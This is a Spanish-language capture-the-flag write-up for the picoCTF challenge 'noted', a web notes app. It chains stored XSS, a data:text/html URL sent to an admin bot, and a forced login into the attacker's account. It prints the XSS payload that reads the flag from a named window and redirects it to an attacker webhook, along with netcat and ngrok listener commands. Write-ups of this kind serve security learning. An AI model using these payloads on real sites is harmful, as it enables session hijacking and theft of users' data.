# Writeup: noted
**Categoría:** Hard
**Fecha de conversión:** 2026-04-24

---

Writeup del CTF "noted" – Obtención de la flag

### Análisis inicial


Se nos proporciona una aplicación web de notas (Node.js + Fastify + SQLite) con las siguientes características:


```
    Los usuarios pueden registrarse, iniciar sesión, crear notas (título y contenido) y eliminarlas.

    Hay protección CSRF en los endpoints /new y /delete mediante el plugin fastify-csrf.

    Los campos title y content tienen una longitud máxima de 30 y 1000 caracteres respectivamente, pero no se aplica ningún escape o sanitización en las plantillas EJS. Esto permite XSS almacenado.

    Existe un endpoint /report (protegido con CSRF) que recibe una URL y la envía a un navegador headless (Puppeteer). El headless:

        Se registra con un usuario aleatorio.

        Crea una nota con título flag y contenido = process.env.FLAG.

        Navega a about:blank (hereda el origen de la app).

        Finalmente visita la URL proporcionada por el usuario.

    El headless no tiene acceso a internet (según la descripción). Sin embargo, en la instancia real sí podía alcanzar servidores externos (o se utilizó un truco para exfiltrar la flag mediante una redirección a un webhook, como veremos).

```

Vulnerabilidades identificadas


```
    XSS almacenado en el campo content (y también en title) de las notas.

    El endpoint /report permite esquemas como data:text/html y javascript:, lo que permite ejecutar código arbitrario en el contexto del headless.

    El headless navega primero a about:blank, lo que hace que el origen de la página sea http://0.0.0.0:8080 (hereda de la pestaña anterior), permitiendo peticiones fetch y acceso al DOM de la aplicación si se abren ventanas.

```

Estrategia de explotación


El objetivo es hacer que el headless (que tiene la flag en su nota) envíe la flag a un servidor controlado por el atacante. Dado que el headless no tiene acceso a internet (en teoría), se podría usar el propio mecanismo de la aplicación para guardar la flag en una nota del atacante. Sin embargo, en la solución práctica se utilizó un webhook (ngrok) para recibir la flag, lo que funcionó porque el headless sí podía hacer peticiones externas.


### Pasos:


```
    El atacante se registra en la aplicación (usuario kr3s4l4).

    Crea una nota con un XSS que, cuando se ejecute en el headless (con su sesión), envíe la flag a un webhook.

    Prepara un servidor receptor (netcat + ngrok) para capturar la flag.

    Envía un reporte con una URL data:text/html que:

        Abre una ventana con la página /notes del headless (donde está la flag) y le asigna un nombre (flag).

        Envía un formulario a /login con las credenciales del atacante, cambiando la sesión del headless a la cuenta del atacante.

        Después de un breve retardo, redirige la ventana principal a /notes?mec, donde se encuentra la nota con el XSS (ahora el headless está logueado como el atacante y ejecutará el script).

    El XSS en la nota del atacante se ejecuta, extrae el contenido de la ventana flag (que aún tiene la página original con la flag) y lo envía al webhook mediante window.location.

```

### Solución paso a paso

1. Preparación del entorno de atacante

```
    Registrarse en la aplicación con usuario kr3s4l4 y contraseña kr3s4l4.

    Iniciar sesión.

```

2. Creación de la nota maliciosa

Crear una nueva nota (título arbitrario, por ejemplo xss) y en el campo contenido pegar el siguiente código:

html


<script>

if (window.location.search.includes("kr3")) {

```
    let w = window.open("", "flag");
    if (w) { 
        let flag = w.document.body.textContent.match(/picoCTF\{[^}]+\}/);
        if (flag) {
            window.location = "https://****.****.**?flag=" + encodeURIComponent(flag[0]);
        }
    }
```

}

</script>


### Explicación:


```
    El script se activa solo si la URL contiene el parámetro ?kr3.

    window.open("", "flag") obtiene la referencia a la ventana que fue abierta con nombre flag (la que contiene la página original del headless).

    Se extrae el texto del cuerpo (document.body.textContent) que contiene la flag.

    Se redirige al webhook del atacante con la flag como parámetro.

```

3. Configuración del receptor

En una terminal (atacante):

bash


```bash
# Iniciar netcat escuchando en el puerto 4444
```

nc -nvlp 4444


En otra terminal, iniciar ngrok para exponer el puerto 4444:

bash


ngrok http 4444 --domain *********.********.**


Se obtiene una URL como https://*****.****.**. Anotarla.

4. Construcción del payload para el reporte

El payload debe ser una URL data:text/html que realice las siguientes acciones en el headless:


```
    Abrir la ventana /notes (donde está la flag) con nombre flag.

    Enviar un formulario a /login con las credenciales del atacante para cambiar la sesión.

    Redirigir la ventana principal a /notes?kr3 para activar el XSS.

```

El código HTML completo (formateado para legibilidad, luego se minifica a una línea):

html


data:text/html,

<form action="http://0.0.0.0:8080/login" method="POST" id="loginform" target="_blank">

<input type="text" name="username" value="kr3s4l4">

<input type="text" name="password" value="kr3s4l4">

</form>  

<script>

window.open("http://0.0.0.0:8080/notes", "flag");

setTimeout(function() { loginform.submit(); }, 1000);

setTimeout(function() { window.location = "http://0.0.0.0:8080/notes?kr3"; }, 2000);

</script>



**Nota**: El formulario se envía a sí mismo (al estar en la misma página) y target="_blank" hace que el resultado se abra en una nueva pestaña (no interfiere con la ventana principal). La redirección final a /notes?mec se produce en la ventana principal, que ahora tiene la sesión cambiada a kr3s4l4 y por tanto mostrará la nota maliciosa.

5. Envío del reporte

Estando logueado como kr3s4l4, ir a la página /report. Se necesita un token CSRF válido para la petición POST. Se puede obtener inspeccionando el formulario de /report o desde la consola. Luego, usando la consola del navegador, se envía el reporte con fetch (o mediante un formulario). En este caso, el usuario lo hizo directamente desde la interfaz web, pegando la URL data:text/html,... en el campo del formulario de reporte y enviándolo.

6. Captura de la flag

Tras enviar el reporte, el headless ejecuta el payload. Al cabo de unos segundos, el netcat recibe una petición GET similar a:

text


GET /?flag=My%20NotesflagpicoCTF{***************************}New%20Note%20|%20Report HTTP/1.1


La flag aparece en el parámetro **flag**:


picoCTF{*******************************}

### Explicación del flujo en el headless


```
    El headless visita data:text/html,... (el payload).

    El script se ejecuta: abre http://0.0.0.0:8080/notes en una ventana llamada flag. Esa ventana contiene la lista de notas del usuario aleatorio del headless, incluyendo la nota con la flag.

    Después de 1 segundo, se envía el formulario a /login con las credenciales de kr3s4l4. Esto cambia la cookie de sesión del headless a la del atacante.

    Después de 2 segundos, la ventana principal (la que mostró el payload) se redirige a http://0.0.0.0:8080/notes?kr3. Como la sesión ahora es la de kr3s4l4, el headless carga la página de notas del atacante.

    En esa página, la nota maliciosa (con el XSS) se renderiza. El script detecta ?kr3 en la URL y se ejecuta.

    El XSS accede a la ventana flag (que sigue abierta y tiene la página original con la flag) mediante window.open("", "flag") y obtiene document.body.textContent, que contiene la flag.

    Finalmente, redirige a https://********.****.**?flag=..., enviando la flag al servidor del atacante.

```

Conclusión


La vulnerabilidad crítica fue la combinación de XSS almacenado, la posibilidad de reportar URLs data:text/html y la capacidad del headless de abrir ventanas que retienen la sesión original. Aunque la descripción indicaba que el headless no tenía acceso a internet, en la práctica se pudo exfiltrar la flag mediante un webhook. Alternativamente, se podría haber guardado la flag en una nota del atacante modificando el XSS para crear una nota vía fetch, pero el método con webhook resultó más directo.


### Flag final: picoCTF{****************************}

